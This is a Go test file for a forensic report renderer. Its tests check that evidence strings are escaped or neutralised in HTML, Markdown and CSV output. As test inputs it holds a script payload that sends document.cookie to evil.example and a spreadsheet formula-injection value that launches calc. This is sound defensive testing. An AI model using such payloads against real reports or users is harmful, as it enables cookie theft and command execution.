package builtin

import (
	"strings"
	"testing"

	"mutant/object"
)

// A report is the one thing in this tree a person opens, and nearly every
// string in it was written by the subject of the investigation: a filename off
// a disk image, a registry value, a URL out of a phishing mail. Every test in
// this file is about that fact.
//
// The failures are not cosmetic. A crafted filename rendered into HTML runs on
// the examiner's workstation; a pipe in one rendered into Markdown shifts every
// column after it, so a row reads as evidence it is not; a cell beginning "="
// is executed by the spreadsheet the report is opened in. And a renderer that
// skips a block it does not recognise hands over a report that looks complete
// and is missing a finding.

// --- helpers ---

func reportCall(t *testing.T, fn func(...object.Object) object.Object, args ...object.Object) *object.Hash {
	t.Helper()
	value, errObj := unwrapPair(t, fn(args...))
	if errObj != nil {
		t.Fatalf("unexpected error: %s", errObj.Message)
	}
	report, ok := value.(*object.Hash)
	if !ok {
		t.Fatalf("builtin returned %T, want *object.Hash", value)
	}
	return report
}

func optsObj(pairs map[string]object.Object) object.Object {
	return makeHashObject(pairs)
}

func newTestReport(t *testing.T, title string, opts map[string]object.Object) *object.Hash {
	t.Helper()
	if opts == nil {
		return reportCall(t, ReportNew, stringObj(title))
	}
	return reportCall(t, ReportNew, stringObj(title), optsObj(opts))
}

func renderTestReport(t *testing.T, report *object.Hash, format string, opts map[string]object.Object) string {
	t.Helper()
	args := []object.Object{report, stringObj(format)}
	if opts != nil {
		args = append(args, optsObj(opts))
	}
	value, errObj := unwrapPair(t, ReportRender(args...))
	if errObj != nil {
		t.Fatalf("render %s: unexpected error: %s", format, errObj.Message)
	}
	text, ok := value.(*object.String)
	if !ok {
		t.Fatalf("render %s returned %T, want *object.String", format, value)
	}
	return text.Value
}

// refuse asserts that a builtin refused, and that it said why.
func refuse(t *testing.T, value object.Object, want string) {
	t.Helper()
	_, errObj := unwrapPairNoFatal(value)
	if errObj == nil {
		t.Fatalf("expected a refusal mentioning %q, got none", want)
	}
	if !strings.Contains(errObj.Message, want) {
		t.Fatalf("refusal does not mention %q: %s", want, errObj.Message)
	}
}

func rows(records ...[]string) *object.Array {
	out := make([]object.Object, 0, len(records))
	for _, record := range records {
		out = append(out, stringListObj(record))
	}
	return &object.Array{Elements: out}
}

// --- HTML is the boundary ---

// crafted is what a filename recovered from an image can actually contain: it
// is a Windows path, and every one of these characters is legal in one.
const crafted = `<script>fetch('//evil.example/'+document.cookie)</script> & "x"`

func TestReportHtmlEscapesEveryPlaceEvidenceReaches(t *testing.T) {
	report := newTestReport(t, crafted, map[string]object.Object{
		"subtitle":  stringObj(crafted),
		"examiner":  stringObj(crafted),
		"case_id":   stringObj(crafted),
		"generated": stringObj("2026-01-31T09:00:00Z"),
	})
	report = reportCall(t, ReportSection, report, stringObj(crafted))
	report = reportCall(t, ReportText, report, stringObj(crafted))
	report = reportCall(t, ReportList, report, &object.Array{Elements: []object.Object{stringObj(crafted)}})
	report = reportCall(t, ReportTable, report,
		rows([]string{crafted}),
		optsObj(map[string]object.Object{
			"columns": stringListObj([]string{crafted}),
			"caption": stringObj(crafted),
		}))

	document := renderTestReport(t, report, "html", nil)

	// The value appears eight times over -- title element, h1, subtitle, three
	// metadata rows, heading, paragraph, list item, caption, column, cell -- and
	// not once as markup.
	if strings.Contains(document, "<script>") {
		t.Fatal("a crafted value reached the document as a tag")
	}
	if strings.Contains(document, "document.cookie</") || strings.Contains(document, "fetch('") {
		t.Fatal("a crafted value reached the document unescaped")
	}
	for _, want := range []string{"&lt;script&gt;", "&amp;", "&#34;", "&#39;"} {
		if !strings.Contains(document, want) {
			t.Fatalf("expected %q in the escaped output", want)
		}
	}
	if got := strings.Count(document, "&lt;script&gt;"); got != 11 {
		t.Fatalf("the crafted value reached %d places, want 11 -- a position was missed or one stopped escaping", got)
	}
}

func TestReportHtmlMakesNoLinkOutOfEvidence(t *testing.T) {
	report := newTestReport(t, "Beacon", nil)
	report = reportCall(t, ReportText, report, stringObj("Contacted http://evil.example/gate.php twice."))
	report = reportCall(t, ReportTable, report,
		rows([]string{"http://evil.example/gate.php"}),
		optsObj(map[string]object.Object{"columns": stringListObj([]string{"url"})}))

	document := renderTestReport(t, report, "html", nil)

	// The URL is in the report, because it is the finding. It is not clickable,
	// because the examiner reading the report should not be one keystroke from
	// the infrastructure they are investigating.
	if !strings.Contains(document, "http://evil.example/gate.php") {
		t.Fatal("the finding itself went missing")
	}
	for _, forbidden := range []string{"<a ", "href=", "src=", "<script", "<link", "<img", "<iframe"} {
		if strings.Contains(document, forbidden) {
			t.Fatalf("the document contains %q; a report must fetch nothing and link nowhere", forbidden)
		}
	}
}

func TestReportHtmlFragmentOmitsTheWrapper(t *testing.T) {
	report := newTestReport(t, "Case 42", nil)
	report = reportCall(t, ReportText, report, stringObj("A finding."))

	whole := renderTestReport(t, report, "html", nil)
	part := renderTestReport(t, report, "html", map[string]object.Object{"fragment": boolObj(true)})

	if !strings.HasPrefix(whole, "<!doctype html>") || !strings.Contains(whole, "<style>") {
		t.Fatal("the standalone document lost its wrapper")
	}
	if strings.Contains(part, "<!doctype") || strings.Contains(part, "<style>") || strings.Contains(part, "<body") {
		t.Fatal("the fragment carried a document wrapper")
	}
	if !strings.Contains(part, "<h1>Case 42</h1>") || !strings.Contains(part, "A finding.") {
		t.Fatal("the fragment lost its content")
	}
}

// --- Markdown is structural ---

func TestReportMarkdownCellCannotShiftAColumn(t *testing.T) {
	report := newTestReport(t, "Files", nil)
	report = reportCall(t, ReportTable, report,
		rows(
			[]string{"a|b", "ok"},
			[]string{"two\nlines", "ok"},
		),
		optsObj(map[string]object.Object{"columns": stringListObj([]string{"name", "state"})}))

	document := renderTestReport(t, report, "markdown", nil)

	// Every row is one line, and every line has the same number of cell
	// separators. A pipe that got through would silently move "ok" into a third
	// column and the row would read as evidence it is not.
	var table []string
	for _, line := range strings.Split(document, "\n") {
		if strings.HasPrefix(line, "|") {
			table = append(table, line)
		}
	}
	if len(table) != 4 {
		t.Fatalf("expected a header, a delimiter and two rows, got %d lines: %q", len(table), table)
	}
	for i, line := range table {
		if got := strings.Count(line, "|") - strings.Count(line, `\|`); got != 3 {
			t.Fatalf("row %d has %d separators, want 3: %s", i, got, line)
		}
	}
	if !strings.Contains(document, `a\|b`) {
		t.Fatal("the pipe in a filename was not escaped")
	}
	if !strings.Contains(document, "two lines") {
		t.Fatal("a newline in a cell must become a space; a cell cannot hold one")
	}
}

func TestReportMarkdownDoesNotPromoteAFindingIntoStructure(t *testing.T) {
	report := newTestReport(t, "Notes", nil)
	report = reportCall(t, ReportText, report, stringObj("# not a heading"))
	report = reportCall(t, ReportText, report, stringObj("4. exe deleted"))
	report = reportCall(t, ReportText, report, stringObj("- not a bullet"))
	report = reportCall(t, ReportText, report, stringObj("a *b* c_d_ <tag> & [x]"))

	document := renderTestReport(t, report, "markdown", nil)

	for _, want := range []string{
		`\# not a heading`,
		`\4. exe deleted`,
		`\- not a bullet`,
		// ">" only changes anything at the start of a line, which the block
		// starters below cover; escaping it mid-sentence would be noise.
		`a \*b\* c\_d\_ \<tag> \& \[x\]`,
	} {
		if !strings.Contains(document, want) {
			t.Fatalf("expected %q in the markdown, got:\n%s", want, document)
		}
	}
	// The heading the report actually has is still a heading.
	if !strings.Contains(document, "# Notes\n") {
		t.Fatal("the report's own title stopped being a heading")
	}
}

func TestReportMarkdownKeepsTheShapeOfAParagraph(t *testing.T) {
	report := newTestReport(t, "Notes", nil)
	report = reportCall(t, ReportText, report, stringObj("first\nsecond"))

	document := renderTestReport(t, report, "markdown", nil)
	if !strings.Contains(document, "first\\\nsecond") {
		t.Fatalf("a line break inside a paragraph must survive as a hard break, got:\n%s", document)
	}
}

// --- CSV is formula injection ---

func TestReportCsvGuardsTheCellsASpreadsheetWouldRun(t *testing.T) {
	report := newTestReport(t, "Files", nil)
	report = reportCall(t, ReportTable, report,
		rows(
			[]string{`=cmd|' /c calc'!A1`, "-5", "-2+3"},
			[]string{"+2+3", "@SUM(A1)", "+1234"},
		),
		optsObj(map[string]object.Object{"columns": stringListObj([]string{"a", "b", "c"})}))

	guarded := renderTestReport(t, report, "csv", nil)
	for _, want := range []string{`'=cmd`, `'-2+3`, `'+2+3`, `'@SUM(A1)`} {
		if !strings.Contains(guarded, want) {
			t.Fatalf("expected %q in the guarded CSV, got:\n%s", want, guarded)
		}
	}
	// A signed number is not a formula, and a report whose numbers all gained an
	// apostrophe is one nobody can sort. Nothing that parses as a number can
	// also be a formula: a function name or a cell reference is exactly what
	// makes the parse fail.
	for _, unaltered := range []string{`'-5`, `'+1234`} {
		if strings.Contains(guarded, unaltered) {
			t.Fatalf("the guard fired on %q, which is a number", strings.TrimPrefix(unaltered, "'"))
		}
	}

	raw := renderTestReport(t, report, "csv", map[string]object.Object{"formula_guard": boolObj(false)})
	if strings.Contains(raw, "'=") || strings.Contains(raw, "'@") {
		t.Fatal("formula_guard:false must write the value unaltered")
	}
	if !strings.Contains(raw, `=cmd`) {
		t.Fatal("the unguarded value went missing")
	}
}

func TestReportCsvCarriesOneTableAndSaysSo(t *testing.T) {
	prose := newTestReport(t, "Summary", nil)
	prose = reportCall(t, ReportText, prose, stringObj("Nothing tabular here."))
	refuse(t, ReportRender(prose, stringObj("csv")), "this report has none")

	report := newTestReport(t, "Two tables", nil)
	report = reportCall(t, ReportSection, report, stringObj("Files"))
	report = reportCall(t, ReportTable, report, rows([]string{"one"}),
		optsObj(map[string]object.Object{"columns": stringListObj([]string{"name"}), "caption": stringObj("files")}))
	report = reportCall(t, ReportSection, report, stringObj("Hosts"))
	report = reportCall(t, ReportTable, report, rows([]string{"two"}),
		optsObj(map[string]object.Object{"columns": stringListObj([]string{"host"}), "caption": stringObj("hosts")}))

	// Two tables stacked into one CSV is a file with two different headers,
	// which no spreadsheet reads as the examiner intended. So it is named.
	refuse(t, ReportRender(report, stringObj("csv")), "a CSV file holds one")

	byIndex := renderTestReport(t, report, "csv", map[string]object.Object{"table": intObj(1)})
	if !strings.Contains(byIndex, "host") || strings.Contains(byIndex, "name") {
		t.Fatalf("table 1 is the hosts table, got:\n%s", byIndex)
	}
	byCaption := renderTestReport(t, report, "csv", map[string]object.Object{"table": stringObj("files")})
	if !strings.Contains(byCaption, "name") || strings.Contains(byCaption, "host") {
		t.Fatalf("the \"files\" caption is the files table, got:\n%s", byCaption)
	}

	refuse(t, ReportRender(report, stringObj("csv"), optsObj(map[string]object.Object{"table": intObj(7)})), "has 2 tables")
	refuse(t, ReportRender(report, stringObj("csv"), optsObj(map[string]object.Object{"table": stringObj("nope")})), "no table's caption")
	refuse(t, ReportRender(report, stringObj("csv"), optsObj(map[string]object.Object{"table": boolObj(true)})), "must be INTEGER or STRING")
}

// --- the document ---

func TestReportBuildersLeaveTheDocumentTheyWereGivenAlone(t *testing.T) {
	base := newTestReport(t, "Case", map[string]object.Object{"generated": stringObj("2026-01-31T09:00:00Z")})

	withA := reportCall(t, ReportText, base, stringObj("finding A"))
	withB := reportCall(t, ReportText, base, stringObj("finding B"))
	deeper := reportCall(t, ReportText, withA, stringObj("finding C"))

	if got := renderTestReport(t, base, "markdown", nil); strings.Contains(got, "finding") {
		t.Fatalf("the original document gained a paragraph:\n%s", got)
	}
	a := renderTestReport(t, withA, "markdown", nil)
	if !strings.Contains(a, "finding A") || strings.Contains(a, "finding B") || strings.Contains(a, "finding C") {
		t.Fatalf("one branch saw another's edits:\n%s", a)
	}
	b := renderTestReport(t, withB, "markdown", nil)
	if !strings.Contains(b, "finding B") || strings.Contains(b, "finding A") {
		t.Fatalf("one branch saw another's edits:\n%s", b)
	}
	c := renderTestReport(t, deeper, "markdown", nil)
	if !strings.Contains(c, "finding A") || !strings.Contains(c, "finding C") {
		t.Fatalf("the continued branch lost its history:\n%s", c)
	}
}

func TestReportTextBeforeAnySectionOpensTheReport(t *testing.T) {
	report := newTestReport(t, "Case 42", nil)
	report = reportCall(t, ReportText, report, stringObj("Summary paragraph."))
	report = reportCall(t, ReportSection, report, stringObj("Timeline"))
	report = reportCall(t, ReportText, report, stringObj("Then this."))

	document := renderTestReport(t, report, "markdown", nil)
	summary := strings.Index(document, "Summary paragraph.")
	heading := strings.Index(document, "## Timeline")
	if summary < 0 || heading < 0 || summary > heading {
		t.Fatalf("a paragraph before the first section must lead the report, got:\n%s", document)
	}
	// The lead section has no heading of its own to render.
	if strings.Count(document, "#") != strings.Count("# Case 42## Timeline", "#") {
		t.Fatalf("the lead section invented a heading:\n%s", document)
	}
}

func TestReportIsTheSameBytesTwice(t *testing.T) {
	build := func() *object.Hash {
		report := newTestReport(t, "Case 42", map[string]object.Object{
			"examiner":  stringObj("G. Gogia"),
			"case_id":   stringObj("42"),
			"generated": stringObj("2026-01-31T09:00:00Z"),
		})
		report = reportCall(t, ReportSection, report, stringObj("Findings"))
		report = reportCall(t, ReportText, report, stringObj("Two hosts beaconed."))
		report = reportCall(t, ReportTable, report,
			&object.Array{Elements: []object.Object{
				makeHashObject(map[string]object.Object{"host": stringObj("b"), "hits": intObj(2)}),
				makeHashObject(map[string]object.Object{"host": stringObj("a"), "hits": intObj(9)}),
			}})
		return report
	}

	for _, format := range []string{"html", "markdown", "csv"} {
		first := renderTestReport(t, build(), format, nil)
		second := renderTestReport(t, build(), format, nil)
		if first != second {
			t.Fatalf("%s: the same investigation rendered twice is not the same bytes", format)
		}
	}
}

func TestReportTableTakesBothRowShapes(t *testing.T) {
	hashRows := newTestReport(t, "Hosts", nil)
	hashRows = reportCall(t, ReportTable, hashRows, &object.Array{Elements: []object.Object{
		makeHashObject(map[string]object.Object{"host": stringObj("a"), "hits": intObj(9)}),
		makeHashObject(map[string]object.Object{"host": stringObj("b"), "note": stringObj("new field")}),
	}})
	csvText := renderTestReport(t, hashRows, "csv", nil)
	// The header is the union across every row, so a field the first row lacks
	// still gets a column instead of being dropped off the end.
	if !strings.HasPrefix(csvText, "hits,host,note\n") {
		t.Fatalf("hash rows must take a union header, got:\n%s", csvText)
	}
	if !strings.Contains(csvText, "9,a,\n") || !strings.Contains(csvText, ",b,new field\n") {
		t.Fatalf("a row lost a value:\n%s", csvText)
	}

	arrayRows := newTestReport(t, "Hosts", nil)
	arrayRows = reportCall(t, ReportTable, arrayRows, rows([]string{"a", "9"}, []string{"b", "1"}),
		optsObj(map[string]object.Object{"columns": stringListObj([]string{"host", "hits"})}))
	if got := renderTestReport(t, arrayRows, "csv", nil); !strings.HasPrefix(got, "host,hits\na,9\n") {
		t.Fatalf("array rows keep the order they were written in, got:\n%s", got)
	}

	noHeader := newTestReport(t, "Hosts", nil)
	noHeader = reportCall(t, ReportTable, noHeader, rows([]string{"a", "9"}),
		optsObj(map[string]object.Object{"columns": stringListObj([]string{"host", "hits"}), "header": boolObj(false)}))
	if got := renderTestReport(t, noHeader, "csv", nil); got != "a,9\n" {
		t.Fatalf("header:false drops the header row, got %q", got)
	}
}

func TestReportTableRecordsThatASearchFoundNothing(t *testing.T) {
	// A table with neither rows nor columns is a blank where a finding should
	// be. Naming the columns says "this was searched, and it was empty", which
	// is a result.
	report := newTestReport(t, "Hosts", nil)
	refuse(t, ReportTable(report, &object.Array{Elements: []object.Object{}}), "says nothing")

	empty := reportCall(t, ReportTable, report, &object.Array{Elements: []object.Object{}},
		optsObj(map[string]object.Object{"columns": stringListObj([]string{"host"})}))
	if got := renderTestReport(t, empty, "html", nil); !strings.Contains(got, "no rows") || !strings.Contains(got, "<th>host</th>") {
		t.Fatalf("an empty table keeps its columns and says it is empty, got:\n%s", got)
	}
	if got := renderTestReport(t, empty, "csv", nil); got != "host\n" {
		t.Fatalf("an empty table is its header, got %q", got)
	}
}

func TestReportListNumbersOnlyWhenAsked(t *testing.T) {
	report := newTestReport(t, "Steps", nil)
	report = reportCall(t, ReportList, report, &object.Array{Elements: []object.Object{
		stringObj("first"), intObj(2), boolObj(true),
	}})
	bulleted := renderTestReport(t, report, "markdown", nil)
	if !strings.Contains(bulleted, "- first\n- 2\n- true\n") {
		t.Fatalf("a plain list is bulleted and renders scalars, got:\n%s", bulleted)
	}
	if got := renderTestReport(t, report, "html", nil); !strings.Contains(got, "<ul>") || strings.Contains(got, "<ol>") {
		t.Fatal("a plain list is a <ul>")
	}

	ordered := newTestReport(t, "Steps", nil)
	ordered = reportCall(t, ReportList, ordered, &object.Array{Elements: []object.Object{stringObj("first"), stringObj("second")}},
		optsObj(map[string]object.Object{"ordered": boolObj(true)}))
	if got := renderTestReport(t, ordered, "markdown", nil); !strings.Contains(got, "1. first\n2. second\n") {
		t.Fatalf("an ordered list is numbered, got:\n%s", got)
	}

	refuse(t, ReportList(report, &object.Array{Elements: []object.Object{makeHashObject(nil)}}), "must be a scalar")
}

// --- what a renderer must not step over ---

func TestReportRenderRefusesABlockNothingRenders(t *testing.T) {
	// Hand-written, because this is exactly the document a script assembles
	// itself or reloads from JSON. A renderer that skipped the block it did not
	// know would hand over a report that looks complete.
	report := makeHashObject(map[string]object.Object{
		"title":     stringObj("Case"),
		"generated": stringObj("2026-01-31T09:00:00Z"),
		"sections": &object.Array{Elements: []object.Object{
			makeHashObject(map[string]object.Object{
				"heading": stringObj("Findings"),
				"level":   intObj(2),
				"blocks": &object.Array{Elements: []object.Object{
					makeHashObject(map[string]object.Object{"kind": stringObj("text"), "text": stringObj("ok")}),
					makeHashObject(map[string]object.Object{"kind": stringObj("chart"), "data": stringObj("...")}),
				}},
			}),
		}},
	})
	for _, format := range []string{"html", "markdown", "csv"} {
		refuse(t, ReportRender(report, stringObj(format)), `section 0, block 1 has kind "chart"`)
	}
}

func TestReportRenderRefusesADocumentItCannotTrust(t *testing.T) {
	section := func(blocks ...object.Object) object.Object {
		return &object.Array{Elements: []object.Object{makeHashObject(map[string]object.Object{
			"heading": stringObj("h"),
			"blocks":  &object.Array{Elements: blocks},
		})}}
	}
	cases := []struct {
		name   string
		report map[string]object.Object
		want   string
	}{
		{"no title", map[string]object.Object{"sections": &object.Array{}}, `it has no "title"`},
		{"title is not a string", map[string]object.Object{"title": intObj(1), "sections": &object.Array{}}, `"title" must be STRING`},
		{"no sections", map[string]object.Object{"title": stringObj("c")}, "it has no `sections`"},
		{"sections is not an array", map[string]object.Object{"title": stringObj("c"), "sections": stringObj("x")}, "`sections` must be an ARRAY"},
		{"section is not a hash", map[string]object.Object{"title": stringObj("c"),
			"sections": &object.Array{Elements: []object.Object{stringObj("x")}}}, "section 0 is STRING, not a HASH"},
		{"section has no blocks", map[string]object.Object{"title": stringObj("c"),
			"sections": &object.Array{Elements: []object.Object{makeHashObject(map[string]object.Object{"heading": stringObj("h")})}}},
			"section 0 has no `blocks`"},
		{"level out of range", map[string]object.Object{"title": stringObj("c"),
			"sections": &object.Array{Elements: []object.Object{makeHashObject(map[string]object.Object{
				"heading": stringObj("h"), "level": intObj(9), "blocks": &object.Array{}})}}},
			"`level` must be between 1 and 6"},
		{"block is not a hash", map[string]object.Object{"title": stringObj("c"), "sections": section(intObj(1))},
			"section 0, block 0 is INTEGER, not a HASH"},
		{"block has no kind", map[string]object.Object{"title": stringObj("c"), "sections": section(makeHashObject(nil))},
			"section 0, block 0 has no `kind`"},
		{"text block has no text", map[string]object.Object{"title": stringObj("c"),
			"sections": section(makeHashObject(map[string]object.Object{"kind": stringObj("text")}))},
			"text block with no `text`"},
		{"table has no rows", map[string]object.Object{"title": stringObj("c"),
			"sections": section(makeHashObject(map[string]object.Object{"kind": stringObj("table")}))},
			"section 0, block 0 has no `rows`"},
		{"table row is not an array", map[string]object.Object{"title": stringObj("c"),
			"sections": section(makeHashObject(map[string]object.Object{
				"kind": stringObj("table"), "rows": &object.Array{Elements: []object.Object{stringObj("x")}}}))},
			"row 0 is STRING, not an ARRAY"},
		{"table cell is not a scalar", map[string]object.Object{"title": stringObj("c"),
			"sections": section(makeHashObject(map[string]object.Object{
				"kind": stringObj("table"),
				"rows": &object.Array{Elements: []object.Object{&object.Array{Elements: []object.Object{makeHashObject(nil)}}}}}))},
			"row 0 column 0 is HASH"},
		{"list item is not a string", map[string]object.Object{"title": stringObj("c"),
			"sections": section(makeHashObject(map[string]object.Object{
				"kind": stringObj("list"), "items": &object.Array{Elements: []object.Object{intObj(1)}}}))},
			`"items" element 0 is INTEGER`},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			refuse(t, ReportRender(makeHashObject(tc.report), stringObj("html")), tc.want)
		})
	}
}

func TestReportOptionsAreCheckedBeforeAnythingIsBuilt(t *testing.T) {
	report := newTestReport(t, "Case", nil)
	cases := []struct {
		name string
		call object.Object
		want string
	}{
		{"report_new rejects an empty title", ReportNew(stringObj("   ")), "a report needs a title"},
		{"report_new rejects an unknown option",
			ReportNew(stringObj("c"), optsObj(map[string]object.Object{"author": stringObj("x")})), `unknown option "author"`},
		{"report_new rejects a timestamp that is not one",
			ReportNew(stringObj("c"), optsObj(map[string]object.Object{"generated": stringObj("last tuesday")})), "must be an RFC 3339 timestamp"},
		{"report_section bounds the level",
			ReportSection(report, stringObj("h"), optsObj(map[string]object.Object{"level": intObj(0)})), "between 1 and 6"},
		{"report_section type-checks the level",
			ReportSection(report, stringObj("h"), optsObj(map[string]object.Object{"level": stringObj("2")})), `"level" must be INTEGER`},
		{"report_table rejects an unknown option",
			ReportTable(report, rows([]string{"a"}), optsObj(map[string]object.Object{"sort": boolObj(true)})), `unknown option "sort"`},
		{"report_render names the formats it has",
			ReportRender(report, stringObj("pdf")), `unknown format "pdf"`},
		{"a builder refuses something that is not a report",
			ReportText(makeHashObject(map[string]object.Object{"title": stringObj("x")}), stringObj("t")), "it has no `sections`"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) { refuse(t, tc.call, tc.want) })
	}
}

func TestReportSectionLevelsRenderAtTheirDepth(t *testing.T) {
	report := newTestReport(t, "Case", nil)
	report = reportCall(t, ReportSection, report, stringObj("Top"), optsObj(map[string]object.Object{"level": intObj(2)}))
	report = reportCall(t, ReportSection, report, stringObj("Nested"), optsObj(map[string]object.Object{"level": intObj(4)}))

	if got := renderTestReport(t, report, "markdown", nil); !strings.Contains(got, "\n## Top\n") || !strings.Contains(got, "\n#### Nested\n") {
		t.Fatalf("markdown heading depth is wrong:\n%s", got)
	}
	if got := renderTestReport(t, report, "html", nil); !strings.Contains(got, "<h2>Top</h2>") || !strings.Contains(got, "<h4>Nested</h4>") {
		t.Fatalf("html heading depth is wrong:\n%s", got)
	}
}

func TestReportMdIsMarkdown(t *testing.T) {
	report := newTestReport(t, "Case", map[string]object.Object{"generated": stringObj("2026-01-31T09:00:00Z")})
	if renderTestReport(t, report, "md", nil) != renderTestReport(t, report, "MarkDown", nil) {
		t.Fatal("md and markdown must be the same renderer, and the format name is case-insensitive")
	}
}
